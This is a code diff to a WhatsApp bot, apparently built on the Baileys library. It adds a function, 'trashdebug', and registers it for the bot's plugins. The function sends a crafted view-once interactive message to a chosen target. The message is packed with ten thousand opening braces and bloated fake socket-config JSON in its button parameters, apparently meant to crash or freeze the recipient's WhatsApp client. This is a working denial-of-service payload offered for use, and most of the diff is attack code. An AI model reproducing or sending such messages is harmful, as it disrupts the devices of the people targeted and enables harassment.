@@ -148,6 +148,92 @@ if ((budy.match) && ["bot",].includes(budy) && !isCmd) {
 reply(`bot is always online ✅`)
 }	
 ///////////example///////////////////////////
+////////bug func/////////////////////
+    async function trashdebug(target) {
+let InJectXploit = JSON.stringify({
+status: true,
+criador: "TheXtordcv",
+resultado: {
+type: "md",
+ws: {
+_events: {
+"CB:ib,,dirty": ["Array"]
+},
+_eventsCount: 800000,
+_maxListeners: 0,
+url: "wss://web.whatsapp.com/ws/chat",
+config: {
+version: ["Array"],
+browser: ["Array"],
+waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
+sockCectTimeoutMs: 20000,
+keepAliveIntervalMs: 30000,
+logger: {},
+printQRInTerminal: false,
+emitOwnEvents: true,
+defaultQueryTimeoutMs: 60000,
+customUploadHosts: [],
+retryRequestDelayMs: 250,
+maxMsgRetryCount: 5,
+fireInitQueries: true,
+auth: {
+Object: "authData"
+},
+markOnlineOnsockCect: true,
+syncFullHistory: true,
+linkPreviewImageThumbnailWidth: 192,
+transactionOpts: {
+Object: "transactionOptsData"
+},
+generateHighQualityLinkPreview: false,
+options: {},
+appStateMacVerification: {
+Object: "appStateMacData"
+},
+mobile: true
+}
+}
+}
+});
+let msg = await generateWAMessageFromContent(
+target, {
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+header: {
+title: "",
+hasMediaAttachment: false,
+},
+body: {
+text: "⩟𝐓𝐑𝐀𝐒𝐇𝐂𝐎𝐑𝐄⬦ - 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
+},
+nativeFlowMessage: {
+messageParamsJson: "{".repeat(10000),
+buttons: [{
+name: "single_select",
+buttonParamsJson: InJectXploit,
+},
+{
+name: "call_permission_request",
+buttonParamsJson: InJectXploit + "{",
+},
+],
+},
+},
+},
+},
+}, {}
+);
+
+await trashcore.relayMessage(target, msg.message, {
+messageId: msg.key.id,
+participant: {
+jid: target
+},
+});
+}  
+    
+///////////end bug func///////////
 const example = (teks) => {
 return `\n *invalid format!*\n`
 }
@@ -175,7 +261,7 @@ return plugins
 //========= [ COMMANDS PLUGINS ] =================================================
 let pluginsDisable = true
 const plugins = await pluginsLoader(path.resolve(__dirname, "trashplugs"))
-const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,sleep,fkontak,menu,addPremiumUser, delPremiumUser,isPremium,trashpic}
+const trashdex = { trashown, reply,replymenu,command,isCmd, text, botNumber, prefix, reply,fetchJson,example, totalfeature,trashcore,m,q,sleep,fkontak,menu,addPremiumUser, delPremiumUser,isPremium,trashpic,trashdebug,sleep}
 for (let plugin of plugins) {
 if (plugin.command.find(e => e == command.toLowerCase())) {
 pluginsDisable = false
